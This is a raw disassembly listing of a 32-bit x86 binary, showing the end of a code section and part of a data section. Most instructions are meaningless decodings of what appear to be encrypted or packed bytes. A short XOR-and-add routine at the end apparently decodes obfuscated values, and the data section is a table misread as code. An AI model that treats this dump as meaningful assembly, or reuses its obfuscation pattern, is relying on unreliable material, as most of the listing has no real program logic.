  411ab8:	shl    DWORD PTR [ebx+0x4ecfafb9],cl
  411abe:	dec    eax
  411abf:	sub    al,0x62
  411ac1:	xor    eax,0x36957757
  411ac6:	adc    ah,bl
  411ac8:	xchg   edi,eax
  411ac9:	and    edx,edx
  411acb:	add    esi,ebp
  411acd:	mov    ebp,eax
  411acf:	ja     0x411a6b
  411ad1:	lock (bad) 
  411ad4:	and    eax,0xbaeb6c45
  411ad9:	or     BYTE PTR [ebx-0xb],ah
  411adc:	icebp  
  411add:	aas    
  411ade:	dec    ebp
  411adf:	test   DWORD PTR [ecx-0x8],ecx
  411ae2:	and    eax,esi
  411ae4:	xor    ebp,esp
  411ae6:	pushf  
  411ae7:	mov    dl,0x8c
  411ae9:	iret   
  411aea:	xchg   DWORD PTR [ebx-0x39],ecx
  411aed:	mov    ebp,0xe920e385
  411af2:	(bad)  
  411af3:	add    bl,BYTE PTR [eax-0x39]
  411af6:	ror    esp,cl
  411af8:	out    0x5d,al
  411afa:	mov    ah,0xf5
  411afc:	daa    
  411afd:	pop    ebx
  411afe:	int3   
  411aff:	pop    ds
  411b00:	call   0x55b18a92
  411b05:	ror    ecx,1
  411b07:	xchg   esp,eax
  411b08:	push   esp
  411b09:	sbb    edi,DWORD PTR [ecx]
  411b0b:	push   0xf856ea8f
  411b10:	(bad)  [esi+edi*1]
  411b13:	push   0x14ff046
  411b18:	test   DWORD PTR [esi],esi
  411b1a:	in     al,dx
  411b1b:	je     0x411ad2
  411b1d:	imul   DWORD PTR [edx+edx*4]
  411b20:	xor    al,0xb3
  411b22:	jecxz  0x411b02
  411b24:	push   cs
  411b25:	jne    0x411b02
  411b27:	int    0x4e
  411b29:	enter  0xadd8,0x7
  411b2d:	rdtsc  
  411b2f:	lods   eax,DWORD PTR ss:[esi]
  411b31:	xchg   esp,eax
  411b32:	pop    edx
  411b33:	fst    DWORD PTR [edi-0x53f40101]
  411b39:	adc    ebx,esp
  411b3b:	inc    edx
  411b3c:	jle    0x411b47
  411b3e:	push   edi
  411b3f:	ja     0x411ad0
  411b41:	jmp    0x411b6c
  411b43:	test   eax,0x85502d10
  411b48:	add    al,BYTE PTR [edi-0xb]
  411b4b:	aam    0x5a
  411b4d:	lods   eax,DWORD PTR ds:[esi]
  411b4e:	retf   
  411b4f:	fnstsw WORD PTR [ecx+eiz*1-0x15]
  411b53:	pand   mm3,QWORD PTR [esi+0x6d420d26]
  411b5a:	icebp  
  411b5b:	popf   
  411b5c:	ror    ebp,0xe5
  411b5f:	jg     0x411b8e
  411b61:	mov    BYTE PTR [eax+0x3f5e0a97],ah
  411b67:	sub    eax,0x1b591152
  411b6c:	test   eax,0xb9e008b6
  411b71:	repnz aaa 
  411b73:	mov    eax,ds:0x7310cd67
  411b78:	lods   eax,DWORD PTR ds:[esi]
  411b79:	push   0xffffffb8
  411b7b:	or     eax,0xf9c02e81
  411b80:	imul   ebx,DWORD PTR ds:0x647cd1ba,0xffffffa8
  411b87:	out    dx,eax
  411b88:	rcr    BYTE PTR [esi+0x6c],1
  411b8b:	and    ah,BYTE PTR [ebx]
  411b8d:	shl    BYTE PTR [eax+edx*2],0x23
  411b91:	pop    ebp
  411b92:	lahf   
  411b93:	out    0x4a,eax
  411b95:	dec    ebx
  411b96:	mov    ebp,0xa53d702a
  411b9b:	repnz (bad) 
  411b9d:	mov    edx,0x898f2d86
  411ba2:	inc    eax
  411ba3:	lea    edi,[eax-0x48495169]
  411ba9:	jmp    0x411c08
  411bab:	cmp    al,0x69
  411bad:	sub    al,dl
  411baf:	in     eax,0x7a
  411bb1:	mov    ebx,0xc96291e3
  411bb6:	xchg   edi,eax
  411bb7:	aad    0xae
  411bb9:	popa   
  411bba:	fild   QWORD PTR [ecx]
  411bbc:	std    
  411bbd:	or     BYTE PTR [edx+0x6a13b403],dl
  411bc3:	icebp  
  411bc4:	les    ebp,FWORD PTR [edi-0x19aa528a]
  411bca:	mov    ds:0x253c1f54,eax
  411bcf:	mov    edi,0x93cfd86a
  411bd4:	xchg   edx,eax
  411bd5:	retf   
  411bd6:	mov    bh,0x3c
  411bd8:	aaa    
  411bd9:	jbe    0x411c56
  411bdb:	push   ecx
  411bdc:	sbb    eax,0x4949ea7e
  411be1:	jmp    FWORD PTR [eax]
  411be3:	ficomp DWORD PTR [ebp-0x66]
  411be6:	sub    BYTE PTR [edi+eax*8],cl
  411be9:	(bad)  
  411bea:	or     BYTE PTR [esi+0x0],bl
  411bed:	in     al,0x27
  411bef:	cmp    al,0x47
  411bf1:	ds xchg ebx,eax
  411bf3:	add    edx,edi
  411bf5:	pop    ebx
  411bf6:	ror    al,cl
  411bf8:	in     al,0x42
  411bfa:	dec    eax
  411bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bfc:	jmp    0x72d2fc57
  411c01:	sar    DWORD PTR [esi-0x82e6330],1
  411c07:	jbe    0x411c16
  411c09:	or     al,0xc5
  411c0b:	pop    edx
  411c0c:	xchg   ebx,eax
  411c0d:	fistp  WORD PTR [eax-0x7a]
  411c10:	retf   0xb499
  411c13:	sub    al,0xe6
  411c15:	dec    eax
  411c16:	jmp    0x411c7b
  411c18:	ins    BYTE PTR es:[edi],dx
  411c19:	and    eax,0x9f11b33b
  411c1e:	push   ecx
  411c1f:	adc    ecx,esi
  411c21:	enter  0x9cb4,0x8d
  411c25:	dec    esp
  411c26:	pop    ds
  411c27:	and    BYTE PTR [edx-0x4f3dfb09],ch
  411c2d:	call   0x6e50:0xe8667bcf
  411c34:	lods   eax,DWORD PTR ds:[esi]
  411c35:	sub    ah,bh
  411c37:	dec    ebx
  411c38:	cli    
  411c39:	inc    esi
  411c3a:	aas    
  411c3b:	push   0x33
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0xeddad6c4
  411c5b:	mov    ds:0x4bc78c49,eax
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	in     eax,0x3b
  411c68:	xor    cl,0xb1
  411c6b:	ficom  WORD PTR [esi+0x3b]
  411c6e:	adc    al,0x6e
  411c70:	into   
  411c71:	or     DWORD PTR [esi],esi
  411c73:	les    ebx,FWORD PTR [ecx-0x77]
  411c76:	test   bh,ah
  411c78:	shl    eax,cl
  411c7a:	mov    ah,0xb4
  411c7c:	popa   
  411c7d:	rcr    al,cl
  411c7f:	std    
  411c80:	aad    0xa
  411c82:	fcmovnbe st,st(1)
  411c84:	add    BYTE PTR [ebp+0x600ad100],cl
  411c8a:	or     esi,edx
  411c8c:	pop    esp
  411c8d:	xchg   dl,ah
  411c8f:	xor    esi,DWORD PTR [ebp-0x5cc097fd]
  411c95:	sahf   
  411c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c98:	mov    ds:0x78119edf,al
  411c9d:	xchg   edi,eax
  411c9e:	inc    eax
  411c9f:	out    dx,eax
  411ca0:	aad    0xe0
  411ca2:	jmp    0x16a6:0x72cf0785
  411ca9:	dec    edx
  411caa:	arpl   WORD PTR [eax-0x175d153],cx
  411cb0:	xchg   edi,eax
  411cb1:	and    BYTE PTR [eax+0x5353219f],cl
  411cb7:	inc    ecx
  411cb8:	xchg   DWORD PTR [eax+0x30],esi
  411cbb:	gs cli 
  411cbd:	push   ss
  411cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbf:	xor    eax,0x32482b4c
  411cc4:	push   ebx
  411cc5:	mov    esp,0x5333a807
  411cca:	mov    ds,WORD PTR [ebx-0x6c]
  411ccd:	scas   eax,DWORD PTR es:[edi]
  411cce:	add    edx,ebp
  411cd0:	jle    0x411c88
  411cd2:	cwde   
  411cd3:	enter  0xd46d,0x8f
  411cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cd8:	pop    ecx
  411cd9:	and    ah,BYTE PTR [ebp-0x7c]
  411cdc:	test   cl,0xb0
  411cdf:	mov    eax,ds:0x4774011c
  411ce4:	cs inc ebx
  411ce6:	sbb    edx,DWORD PTR [edi]
  411ce8:	icebp  
  411ce9:	mov    ebp,0x65764ca3
  411cee:	std    
  411cef:	sub    al,0xc8
  411cf1:	loope  0x411c9e
  411cf3:	loopne 0x411ca2
  411cf5:	jne    0x411d1a
  411cf7:	(bad)  
  411cf8:	fisub  WORD PTR [esi+0x37]
  411cfb:	dec    edi
  411cfc:	xchg   esi,eax
  411cfd:	push   es
  411cfe:	aad    0xf3
  411d00:	or     BYTE PTR [ecx],dh
  411d02:	sbb    bh,cl
  411d04:	ficom  WORD PTR [ebx*2+0xdc9b99]
  411d0b:	xor    BYTE PTR es:[edx],cl
  411d0e:	fmul   DWORD PTR [esi+ecx*4+0x4014bbcb]
  411d15:	cmp    al,0xeb
  411d17:	mov    dl,0xeb
  411d19:	pop    es
  411d1a:	or     WORD PTR [edi+0x2b283efa],bx
  411d21:	or     cl,BYTE PTR [ecx]
  411d23:	or     eax,0x891311aa
  411d28:	data16 jo 0x411d56
  411d2b:	mov    ch,0xc5
  411d2d:	push   edi
  411d2e:	ss dec ebx
  411d30:	cmp    edx,edi
  411d32:	mov    es,WORD PTR [edi]
  411d34:	jae    0x411d97
  411d36:	imul   esi,ebx,0x43
  411d39:	addr16 sbb eax,0x6ca4fa9
  411d3f:	mov    cl,0x7e
  411d41:	or     ecx,ebp
  411d43:	call   0xc551:0x735a77fe
  411d4a:	in     eax,0x7a
  411d4c:	sub    bl,BYTE PTR [edx-0x40eb8958]
  411d52:	lea    ebx,[ebp+0x758f31c5]
  411d58:	dec    ecx
  411d59:	in     al,0x9d
  411d5b:	(bad)  
  411d5c:	fadd   DWORD PTR [edi-0x683aecc9]
  411d62:	inc    esi
  411d63:	cld    
  411d64:	pop    ebx
  411d65:	cwde   
  411d66:	loopne 0x411d93
  411d68:	mov    al,ds:0x5a075b26
  411d6d:	jb     0x411db7
  411d6f:	in     al,dx
  411d70:	push   cs
  411d71:	(bad)  
  411d72:	aas    
  411d73:	rol    BYTE PTR [esp+ecx*8-0x49],cl
  411d77:	mov    eax,0xcf67f8b6
  411d7c:	sbb    eax,0x7d15d15d
  411d81:	lds    esp,FWORD PTR [eax-0x2b]
  411d84:	hlt    
  411d85:	jmp    0x411dd1
  411d87:	xor    al,0xea
  411d89:	cld    
  411d8a:	mov    edi,0xafbb7804
  411d8f:	pusha  
  411d90:	jo     0x411d90
  411d92:	xor    DWORD PTR [esi*4+0x64802f12],0xfffffff6
  411d9a:	neg    DWORD PTR [ecx-0x57b9585d]
  411da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411da1:	fld    QWORD PTR [eax+0x47]
  411da4:	inc    edi
  411da5:	xchg   edx,eax
  411da6:	cdq    
  411da7:	xchg   ch,ah
  411da9:	retf   
  411daa:	or     eax,0x309ce4ac
  411daf:	xlat   BYTE PTR ds:[ebx]
  411db0:	dec    ecx
  411db1:	xor    ebx,DWORD PTR [edi+0x542afb38]
  411db7:	mov    DWORD PTR [ecx-0x21],esi
  411dba:	ins    DWORD PTR es:[edi],dx
  411dbb:	dec    edi
  411dbc:	dec    ebp
  411dbe:	hlt    
  411dbf:	push   edi
  411dc0:	dec    ebp
  411dc1:	inc    edi
  411dc2:	adc    cl,0x22
  411dc5:	mov    ds:0xc9249044,eax
  411dca:	fs (bad) 
  411dcd:	sub    eax,0xc9ce3456
  411dd2:	jl     0x411d9b
  411dd4:	xor    eax,0x35047de6
  411dd9:	push   eax
  411dda:	push   edx
  411ddb:	and    al,0xc5
  411ddd:	mov    dh,0xc9
  411ddf:	in     al,dx
  411de0:	add    al,0x2e
  411de2:	adc    eax,0xfb0b754a
  411de7:	mov    bh,0xe8
  411de9:	clc    
  411dea:	push   ds
  411deb:	jge    0x411dc9
  411ded:	add    al,BYTE PTR [ebx-0x3f7d8032]
  411df3:	xchg   ebx,eax
  411df4:	inc    ebx
  411df5:	xlat   BYTE PTR ds:[ebx]
  411df6:	push   edx
  411df7:	or     edi,0xb598931f
  411dfd:	out    dx,al
  411dfe:	sub    edx,DWORD PTR [ebx+0x67df2561]
  411e04:	aad    0xf2
  411e06:	sar    DWORD PTR [ecx],cl
  411e08:	out    0x29,eax
  411e0a:	ja     0x411da3
  411e0c:	mov    WORD PTR [eax+0x30607a13],ss
  411e12:	lock and BYTE PTR [bp+di+0x7283],al
  411e18:	adc    ebp,DWORD PTR [ecx+0x6]
  411e1b:	rcr    DWORD PTR [ebp-0x64],1
  411e1e:	call   FWORD PTR [ecx+0xe48c23f]
  411e24:	mov    ds:0x1a7c9754,al
  411e29:	sub    eax,0x20d30b7b
  411e2e:	aam    0xa0
  411e30:	pop    edi
  411e31:	imul   ebp,esi,0x6e25705c
  411e37:	shl    DWORD PTR [esi+esi*4],0x74
  411e3b:	imul   ebx,DWORD PTR [ecx],0xde8fe73a
  411e41:	mov    eax,ds:0x8a6e44b7
  411e46:	inc    ebx
  411e47:	inc    esi
  411e48:	outs   dx,DWORD PTR ds:[esi]
  411e49:	outs   dx,DWORD PTR ds:[esi]
  411e4a:	and    ebx,0xa10f6b8c
  411e50:	inc    edi
  411e51:	mov    cl,0xa4
  411e53:	sbb    DWORD PTR [eax-0x532d3c71],edx
  411e59:	push   esi
  411e5a:	adc    BYTE PTR [edi-0x37],0x61
  411e5e:	stc    
  411e5f:	cmp    dh,BYTE PTR [esi+ebx*2]
  411e62:	neg    BYTE PTR [edi]
  411e64:	xor    bh,ah
  411e66:	jne    0x411e8c
  411e68:	in     eax,dx
  411e69:	inc    edx
  411e6a:	stc    
  411e6b:	and    DWORD PTR ds:0x488d79d4,edi
  411e71:	test   DWORD PTR [eax],0xe3239265
  411e77:	mov    cl,BYTE PTR [esi+0x6d]
  411e7a:	das    
  411e7b:	pop    edx
  411e7c:	jbe    0x411e9c
  411e7e:	fisubr WORD PTR [edi]
  411e80:	mov    esp,0x397c6935
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
